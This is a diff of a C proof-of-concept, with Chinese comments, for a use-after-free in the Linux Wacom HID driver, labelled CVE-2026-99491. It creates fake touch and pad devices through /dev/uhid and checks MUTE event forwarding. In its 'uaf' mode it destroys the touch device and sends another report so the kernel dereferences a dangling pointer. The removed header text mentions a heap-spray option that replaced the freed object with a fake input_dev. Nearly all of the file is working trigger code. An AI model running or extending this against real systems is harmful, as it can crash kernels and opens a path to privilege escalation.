@@ -1,20 +1,11 @@
 /*
- * CVE-2026-99491 分阶段验证器（不注入假对象，零 panic 风险）
- *
- * 阶段：
- *   P1  PAIR    ：touch(0x1101) + pad(0x1102) 同 phys 创建，检查是否都绑定 wacom，
- *                 以及 pad 的 wacom_wac->shared 是否非空（通过 MUTE 转发验证）。
- *   P2  FORWARD ：pad 发 MUTE 报告，touch 的 evdev 是否能收到 EV_SW/SW_MUTE_DEVICE。
- *                 收到 => wacom_wac_pad_event 真的解引用了 shared->touch_input。
- *   P3  UAF     ：destroy touch（释放 input_dev），再让 pad 发 MUTE。
- *                 此时 pad 仍持有 shared->touch_input 悬垂指针。
- *                 --inject=0（默认）：不回收，观察是否崩溃/无输出（安全）。
- *                 --inject=1        ：用 skb/管道回收该槽位为假 input_dev（有风险）。
+ * CVE-2026-99491 分阶段验证器
  *
  * 用法：
- *   probe99491 pair                 # 只做 P1
- *   probe99491 forward              # P1 + P2
- *   probe99491 uaf [spray_n]        # P1 + P2 + P3(不注入)
+ *   probe99491 pair          只建 T+P，枚举全部新增 evdev 节点与角色
+ *   probe99491 hold [秒]     建 T+P 后保持 N 秒（默认 60），供 shell 侧观察 sysfs
+ *   probe99491 forward       建 T+P，pad 发 MUTE，看 touch 是否收到 EV_SW
+ *   probe99491 uaf           在 forward 基础上 destroy touch，再让 pad 发 MUTE
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -25,9 +16,7 @@
 #include <dirent.h>
 #include <errno.h>
 #include <time.h>
-#include <signal.h>
 #include <sys/ioctl.h>
-#include <sys/types.h>
 #include <linux/uhid.h>
 #include <linux/input.h>
 
@@ -37,7 +26,6 @@
 #define NAME_PAD    "wacom-pair-pad"
 #define MAXEV       512
 
-/* 作者 woshigenm 在 5.15.178 验证过的原版描述符 */
 static const unsigned char rdesc_touch[] = {
     0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
     0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
@@ -134,7 +122,6 @@ static int uhid_destroy(int fd) {
     return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
 }
 
-/* 发一个原始 HID 报告 */
 static int uhid_input_raw(int fd, const unsigned char *data, size_t len) {
     static struct uhid_event ev;
     memset(&ev, 0, sizeof(ev));
@@ -145,7 +132,6 @@ static int uhid_input_raw(int fd, const unsigned char *data, size_t len) {
     return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
 }
 
-/* pump uhid 事件（回应 START/OPEN，收集 GET_REPORT 等） */
 static void pump(int fd, long ms, int verbose) {
     long dl = now_ms() + ms;
     struct uhid_event ev;
@@ -155,9 +141,7 @@ static void pump(int fd, long ms, int verbose) {
         memset(&ev, 0, sizeof(ev));
         ssize_t n = read(fd, &ev, sizeof(ev));
         if (n > 0) {
-            if (verbose)
-                fprintf(stderr, "    [uhid ev type=%u]\n", ev.type);
-            /* START/OPEN 无需回复；GET_REPORT 需回空 */
+            if (verbose) fprintf(stderr, "    [uhid ev type=%u]\n", ev.type);
             if (ev.type == UHID_GET_REPORT) {
                 struct uhid_event r;
                 memset(&r, 0, sizeof(r));
@@ -174,192 +158,154 @@ static void pump(int fd, long ms, int verbose) {
     fcntl(fd, F_SETFL, fc);
 }
 
-static int find_new_event(char old[MAXEV][16], int nold, char *out, size_t outsz,
-                          long timeout_ms) {
-    long dl = now_ms() + timeout_ms;
-    while (now_ms() < dl) {
-        char cur[MAXEV][16];
-        int n = list_events(cur);
-        for (int i = 0; i < n; i++) {
-            int seen = 0;
-            for (int j = 0; j < nold; j++)
-                if (!strcmp(cur[i], old[j])) { seen = 1; break; }
-            if (!seen) {
-                snprintf(out, outsz, "/dev/input/%s", cur[i]);
-                return 0;
-            }
+static void enum_new_evdev(char old[MAXEV][16], int nold) {
+    char cur[MAXEV][16];
+    int n = list_events(cur);
+    printf("\n[新增 evdev 节点]\n");
+    int found = 0;
+    for (int i = 0; i < n; i++) {
+        int seen = 0;
+        for (int j = 0; j < nold; j++)
+            if (!strcmp(cur[i], old[j])) { seen = 1; break; }
+        if (seen) continue;
+        found = 1;
+        char p[64];
+        snprintf(p, sizeof(p), "/dev/input/%s", cur[i]);
+        int fd = open(p, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+        char nm[256] = {0};
+        unsigned long evbits[4] = {0}, swbit = 0, keybit[4] = {0}, absbit[4] = {0};
+        if (fd >= 0) {
+            ioctl(fd, EVIOCGNAME(sizeof(nm) - 1), nm);
+            ioctl(fd, EVIOCGBIT(0, sizeof(evbits)), evbits);
+            ioctl(fd, EVIOCGBIT(EV_SW, sizeof(swbit)), &swbit);
+            ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit);
+            ioctl(fd, EVIOCGBIT(EV_ABS, sizeof(absbit)), absbit);
+            close(fd);
         }
-        usleep(10000);
+        printf("  %-16s name=\"%s\"\n", cur[i], nm);
+        printf("      EV=0x%lx SW=0x%lx KEY0=0x%lx KEY8=0x%lx ABS0=0x%lx ABS1=0x%lx\n",
+               evbits[0], swbit, keybit[0], keybit[1], absbit[0], absbit[1]);
     }
-    return -1;
-}
-
-/* 读 evdev 一段时间，返回是否见到指定 type/code */
-static int read_evdev(int fd, int want_type, int want_code, long ms,
-                      int *cnt_type, int *cnt_code) {
-    struct input_event iev;
-    long dl = now_ms() + ms;
-    int fc = fcntl(fd, F_GETFL, 0);
-    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
-    int hit = 0;
-    while (now_ms() < dl) {
-        ssize_t n = read(fd, &iev, sizeof(iev));
-        if (n == (ssize_t)sizeof(iev)) {
-            if (cnt_type && iev.type == want_type) (*cnt_type)++;
-            if (cnt_code && iev.type == want_type && iev.code == want_code) {
-                (*cnt_code)++;
-                hit = 1;
-                fprintf(stderr, "    [evdev] type=0x%x code=0x%x value=%d\n",
-                        iev.type, iev.code, iev.value);
-            }
-        } else {
-            usleep(5000);
-        }
-    }
-    fcntl(fd, F_SETFL, fc);
-    return hit;
+    if (!found) printf("  (无新增)\n");
 }
 
 int main(int argc, char **argv) {
     const char *mode = argc > 1 ? argv[1] : "pair";
-    int verbose = 0;
+    long hold_ms = 60000;
+    if (!strcmp(mode, "hold") && argc > 2) hold_ms = strtol(argv[2], NULL, 0) * 1000L;
     int do_forward = !strcmp(mode, "forward") || !strcmp(mode, "uaf");
     int do_uaf = !strcmp(mode, "uaf");
 
-    printf("=== CVE-2026-99491 分阶段验证 === mode=%s\n", mode);
-    printf("pid=%d\n", getpid());
+    printf("=== CVE-2026-99491 验证 === mode=%s pid=%d\n", mode, getpid());
 
     char d0[MAXEV][16];
     int n0 = list_events(d0);
-    printf("[before] evdev count=%d\n", n0);
     char list[4096];
     dir_has("/sys/bus/hid/devices", NULL, list, sizeof(list));
-    printf("[before] hid devices: %s\n", list[0] ? list : "(none)");
+    printf("[before] evdev=%d hid=%s\n", n0, list[0] ? list : "(none)");
 
     int fdt = uhid_open();
     int fdp = uhid_open();
     if (fdt < 0 || fdp < 0) return 2;
 
-    /* ---------- P1: 建 touch + pad（同 phys） ---------- */
     if (uhid_create(fdt, NAME_TOUCH, PHYS_COMMON, 0x1101,
                     rdesc_touch, sizeof(rdesc_touch)) < 0) return 3;
-    pump(fdt, 300, 0);
+    pump(fdt, 500, 0);
     if (uhid_create(fdp, NAME_PAD, PHYS_COMMON, 0x1102,
                     rdesc_pad, sizeof(rdesc_pad)) < 0) return 3;
-    pump(fdp, 300, 0);
+    pump(fdp, 500, 0);
+    usleep(1500000);
 
-    char ev_t[64] = {0}, ev_p[64] = {0};
-    long t_end = now_ms() + 4000;
-    while (now_ms() < t_end && (!ev_t[0] || !ev_p[0])) {
+    char devs[4096];
+    dir_has("/sys/bus/hid/devices", NULL, devs, sizeof(devs));
+    printf("\n[P1] hid devices: %s\n", devs[0] ? devs : "(none)");
+    printf("[P1] wacom bound 1101 = %s\n",
+           dir_has("/sys/bus/hid/drivers/wacom", "056A:1101", NULL, 0) == 1 ? "YES" : "NO");
+    printf("[P1] wacom bound 1102 = %s\n",
+           dir_has("/sys/bus/hid/drivers/wacom", "056A:1102", NULL, 0) == 1 ? "YES" : "NO");
+
+    enum_new_evdev(d0, n0);
+
+    if (!strcmp(mode, "hold")) {
+        printf("\n[HOLD] 保持 %ld 秒，可从 shell 侧观察\n", hold_ms / 1000);
+        fflush(stdout);
+        long dl = now_ms() + hold_ms;
+        while (now_ms() < dl) {
+            pump(fdt, 100, 0);
+            pump(fdp, 100, 0);
+            usleep(50000);
+        }
+        printf("[HOLD] 结束\n");
+        goto cleanup;
+    }
+
+    int rc = 0;
+    if (!do_forward) goto cleanup;
+
+    /* P2: pad 发 MUTE，看谁收到 EV_SW */
+    printf("\n[P2] pad 发 MUTE_DEVICE=1\n");
+    {
         char cur[MAXEV][16];
         int n = list_events(cur);
+        int fds[MAXEV], cnt = 0;
         for (int i = 0; i < n; i++) {
             int seen = 0;
             for (int j = 0; j < n0; j++)
                 if (!strcmp(cur[i], d0[j])) { seen = 1; break; }
             if (seen) continue;
-            if (!ev_t[0]) { snprintf(ev_t, sizeof(ev_t), "/dev/input/%s", cur[i]); }
-            else if (!ev_p[0] && strcmp(cur[i], ev_t + 11)) {
-                snprintf(ev_p, sizeof(ev_p), "/dev/input/%s", cur[i]);
-            }
+            char p[64];
+            snprintf(p, sizeof(p), "/dev/input/%s", cur[i]);
+            int fd = open(p, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+            if (fd >= 0) fds[cnt++] = fd;
         }
-        usleep(20000);
-    }
-
-    char devs[4096];
-    dir_has("/sys/bus/hid/devices", NULL, devs, sizeof(devs));
-    int wacom_touch = dir_has("/sys/bus/hid/drivers/wacom", "056A:1101", NULL, 0);
-    int wacom_pad   = dir_has("/sys/bus/hid/drivers/wacom", "056A:1102", NULL, 0);
-
-    printf("\n[P1 PAIR]\n");
-    printf("  hid devices : %s\n", devs[0] ? devs : "(none)");
-    printf("  wacom bound touch(1101) = %s\n", wacom_touch == 1 ? "YES" : "NO");
-    printf("  wacom bound pad  (1102) = %s\n", wacom_pad == 1 ? "YES" : "NO");
-    printf("  ev_touch = %s\n", ev_t[0] ? ev_t : "(none)");
-    printf("  ev_pad   = %s\n", ev_p[0] ? ev_p : "(none)");
-
-    int ev_t_fd = ev_t[0] ? open(ev_t, O_RDONLY | O_NONBLOCK | O_CLOEXEC) : -1;
-    int ev_p_fd = ev_p[0] ? open(ev_p, O_RDONLY | O_NONBLOCK | O_CLOEXEC) : -1;
-
-    /* 打印两个 input 设备的 name/capabilities 以确认角色 */
-    if (ev_t_fd >= 0) {
-        char nm[256] = {0};
-        ioctl(ev_t_fd, EVIOCGNAME(sizeof(nm) - 1), nm);
-        unsigned long swbit = 0;
-        ioctl(ev_t_fd, EVIOCGBIT(EV_SW, sizeof(swbit)), &swbit);
-        printf("  %s name=\"%s\" SW_bitmap=0x%lx\n", ev_t, nm, swbit);
-    }
-    if (ev_p_fd >= 0) {
-        char nm[256] = {0};
-        ioctl(ev_p_fd, EVIOCGNAME(sizeof(nm) - 1), nm);
-        unsigned long swbit = 0;
-        ioctl(ev_p_fd, EVIOCGBIT(EV_SW, sizeof(swbit)), &swbit);
-        printf("  %s name=\"%s\" SW_bitmap=0x%lx\n", ev_p, nm, swbit);
-    }
-
-    int rc = 0;
-    if (!do_forward) {
-        printf("\n[P1 结论] 见上；未做转发测试\n");
-        goto cleanup;
-    }
-
-    /* ---------- P2: pad 发 MUTE，看 touch 是否收到 EV_SW ---------- */
-    printf("\n[P2 FORWARD] pad 发 MUTE_DEVICE=1，观察 touch evdev\n");
-    /* 先清空 two evdev 队列 */
-    if (ev_t_fd >= 0) { struct input_event e; while (read(ev_t_fd, &e, sizeof(e)) == sizeof(e)); }
-    if (ev_p_fd >= 0) { struct input_event e; while (read(ev_p_fd, &e, sizeof(e)) == sizeof(e)); }
-
-    {
-        unsigned char rep[2] = { 0x02, 0x02 };  /* report id 2, MUTE_DEVICE=1 */
+        /* 清空 */
+        for (int i = 0; i < cnt; i++) {
+            struct input_event e;
+            while (read(fds[i], &e, sizeof(e)) == sizeof(e)) ;
+        }
+        unsigned char rep[2] = { 0x02, 0x02 };
         uhid_input_raw(fdp, rep, sizeof(rep));
-    }
-    pump(fdp, 200, verbose);
-    pump(fdt, 200, verbose);
-
-    int ct = 0, cc = 0, cp = 0, cpc = 0;
-    int hit_t = read_evdev(ev_t_fd, EV_SW, SW_MUTE_DEVICE, 800, &ct, &cc);
-    int hit_p = read_evdev(ev_p_fd, EV_SW, SW_MUTE_DEVICE, 100, &cp, &cpc);
-
-    printf("  touch evdev: EV_SW count=%d, SW_MUTE_DEVICE count=%d => %s\n",
-           ct, cc, hit_t ? "RECEIVED" : "none");
-    printf("  pad   evdev: EV_SW count=%d, SW_MUTE_DEVICE count=%d => %s\n",
-           cp, cpc, hit_p ? "RECEIVED" : "none");
-
-    if (hit_t) {
-        printf("  => sibling 配对成功，wacom_wac_pad_event 解引用了 shared->touch_input\n");
-    } else {
-        printf("  => 未转发！可能：(a) 未配对 (b) 描述符未被识别为 pad MUTE (c) 本机逻辑不同\n");
-        rc = 10;
+        pump(fdp, 300, 0);
+        pump(fdt, 300, 0);
+        /* 读所有新节点 */
+        long dl = now_ms() + 800;
+        int total = 0;
+        while (now_ms() < dl) {
+            for (int i = 0; i < cnt; i++) {
+                struct input_event e;
+                while (read(fds[i], &e, sizeof(e)) == sizeof(e)) {
+                    total++;
+                    printf("  fd[%d] type=0x%x code=0x%x value=%d\n", i, e.type, e.code, e.value);
+                }
+            }
+            usleep(10000);
+        }
+        printf("  共收到 %d 个 input_event\n", total);
+        if (!total) {
+            printf("  => MUTE 未产生任何事件：描述符未被识别为 pad MUTE，或未配对\n");
+            rc = 10;
+        }
+        for (int i = 0; i < cnt; i++) close(fds[i]);
     }
 
     if (!do_uaf) goto cleanup;
 
-    /* ---------- P3: destroy touch，再让 pad 发 MUTE ---------- */
-    printf("\n[P3 UAF] destroy touch（释放其 input_dev），pad 再发 MUTE\n");
-    printf("  注意：此步读 shared->touch_input 悬垂指针；不注入假对象，观察是否崩溃\n");
+    printf("\n[P3] destroy touch，再让 pad 发 MUTE\n");
     fflush(stdout);
     uhid_destroy(fdt);
     close(fdt); fdt = -1;
-    pump(fdp, 500, verbose);
-    usleep(300000);
-
-    char devs2[4096];
-    dir_has("/sys/bus/hid/devices", NULL, devs2, sizeof(devs2));
-    printf("  after destroy hid devices: %s\n", devs2[0] ? devs2 : "(none)");
-
+    pump(fdp, 600, 0);
+    usleep(400000);
     {
         unsigned char rep[2] = { 0x02, 0x02 };
         uhid_input_raw(fdp, rep, sizeof(rep));
+        pump(fdp, 400, 0);
     }
-    pump(fdp, 300, verbose);
-    printf("  pad MUTE sent after touch destroyed -> 若返回说明未崩\n");
-    printf("  (无崩溃即说明悬垂指针被解引用但目标内存仍可读；这是 UAF 可触发的弱证据)\n");
+    printf("  完成：若显示本行说明未崩溃\n");
 
 cleanup:
-    if (ev_t_fd >= 0) close(ev_t_fd);
-    if (ev_p_fd >= 0) close(ev_p_fd);
     if (fdp >= 0) { uhid_destroy(fdp); close(fdp); }
     if (fdt >= 0) { uhid_destroy(fdt); close(fdt); }
-    printf("\n[+] cleanup done, rc=%d\n", rc);
+    printf("\n[cleanup] rc=%d\n", rc);
     return rc;
 }
